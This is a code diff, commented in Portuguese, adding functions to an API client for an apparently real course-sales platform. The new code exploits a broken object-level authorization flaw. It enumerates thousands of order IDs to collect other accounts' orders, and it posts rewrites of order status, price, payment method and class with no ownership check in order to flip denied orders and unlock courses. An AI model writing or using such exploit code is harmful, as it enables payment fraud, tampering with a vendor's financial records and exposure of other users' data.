@@ -110,6 +110,59 @@ export function createArtClient(config = {}, fetchImplementation = fetch) {
     });
   }
 
+  // Lê uma order específica (GET /v1/crud/orders/{id}). O endpoint aceita
+  // GET/HEAD/POST/DELETE (PUT -> 405). Usado para inspecionar o status real de
+  // uma order DENIED/PENDING antes de decidir o vetor de recuperação.
+  function getOrder({ idOrder, xApiKey, token }) {
+    return requestJson(`${apiOrigin}/v1/crud/orders/${encodeURIComponent(String(idOrder))}`, {
+      headers: headersFor(xApiKey, token),
+    });
+  }
+
+  // Varredura de orders da conta por range de id (GET /v1/crud/orders/{id}).
+  // Fallback para findOrdersByStudent, que pode não listar orders DENIED (o
+  // caso do CFA). Retorna as orders cujo id_usuario casa com o profileId.
+  async function scanOrdersByRange({ profileId, xApiKey, token, lo = 3129000, hi = 3136000, concurrency = 20, onLog }) {
+    const out = [];
+    const seen = new Set();
+    const probe = async (oid) => {
+      if (seen.has(oid)) return;
+      seen.add(oid);
+      try {
+        const r = await requestJson(`${apiOrigin}/v1/crud/orders/${oid}`, {
+          headers: headersFor(xApiKey, token), timeoutMs: 6_000,
+        });
+        if (r.status === 200 && r.body && typeof r.body === "object" && r.body.id_order) {
+          out.push(r.body);
+        }
+      } catch { /* 404/erro — segue */ }
+    };
+    for (let start = lo; start <= hi; start += concurrency) {
+      const batch = [];
+      for (let oid = start; oid < Math.min(start + concurrency, hi + 1); oid += 1) batch.push(oid);
+      await Promise.all(batch.map(probe));
+      if (out.length && out.length % 50 === 0) onLog?.(`[scan] ${out.length} orders coletadas ate ${start}`);
+    }
+    const filtered = profileId
+      ? out.filter((b) => String(b.id_usuario) === String(profileId))
+      : out;
+    onLog?.(`[scan] varredura ${lo}..${hi}: ${out.length} orders totais, ${filtered.length} da conta`);
+    return filtered;
+  }
+
+  // Flip determinístico de order via POST /v1/crud/orders/{id} (BOLA write,
+  // descoberto na pesquisa Metodos-Toro 2026-08-01). Resolve orders DENIED —
+  // o fluxo delete+re-enroll só destrava PENDING zumbi. O body reescreve
+  // status/valor/metodo/id_turma/json_retorno sem ownership check (200 "1").
+  // id_turma TOP-LEVEL controla a visibilidade no findCoursesByStudent (VETOR D).
+  function updateOrder({ idOrder, payload, xApiKey, token }) {
+    return requestJson(`${apiOrigin}/v1/crud/orders/${encodeURIComponent(String(idOrder))}`, {
+      method: "POST",
+      headers: headersFor(xApiKey, token, true),
+      body: JSON.stringify(payload),
+    });
+  }
+
   function findCoursesByStudent({ email, xApiKey, token }) {
     const url = new URL(`${apiOrigin}/v1/services/aluno/findCoursesByStudent`);
     url.searchParams.set("email", email);
@@ -187,6 +240,9 @@ export function createArtClient(config = {}, fetchImplementation = fetch) {
     findStudent,
     findOrdersByStudent,
     deleteOrder,
+    getOrder,
+    updateOrder,
+    scanOrdersByRange,
     findCoursesByStudent,
     syncStudentProfile,
     startCheckoutProcess,
